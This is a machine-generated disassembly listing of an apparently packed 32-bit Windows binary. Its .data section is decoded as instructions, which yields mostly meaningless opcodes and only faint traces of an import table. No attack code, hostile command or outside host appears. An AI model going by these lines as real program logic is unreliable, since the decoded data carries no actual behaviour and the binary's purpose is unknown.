  412b88:	icebp  
  412b89:	ret    0x3ba7
  412b8c:	lods   eax,DWORD PTR ds:[esi]
  412b8d:	mov    esp,0x9ac5284e
  412b92:	jmp    0xc8f2:0xacf0ac77
  412b99:	inc    ecx
  412b9a:	and    eax,0xc85466ac
  412b9f:	sub    al,0x9
  412ba1:	leave  
  412ba2:	jae    0x412bef
  412ba4:	repz inc esp
  412ba6:	push   0x605c81ce
  412bab:	call   0x1b0d3d50
  412bb0:	retf   
  412bb1:	push   esp
  412bb2:	jb     0x412c17
  412bb4:	jbe    0x412b8c
  412bb6:	jns    0x412bbf
  412bb8:	xchg   di,ax
  412bba:	jle    0x412b47
  412bbc:	imul   ecx,DWORD PTR [esi+edi*4+0x37b79b94],0x893492eb
  412bc7:	mov    ah,0xfe
  412bc9:	cmp    al,0x1a
  412bcb:	push   esi
  412bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bcd:	fwait
  412bce:	pop    ss
  412bcf:	loopne 0x412b73
  412bd1:	ja     0x412c40
  412bd3:	mov    esp,0x5eb90826
  412bd8:	repz push eax
  412bda:	dec    esp
  412bdb:	mov    edi,0x5b046aae
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0x43000000
  413429:	dec    edx
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	inc    ebx
  41342d:	cmp    al,0x3
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
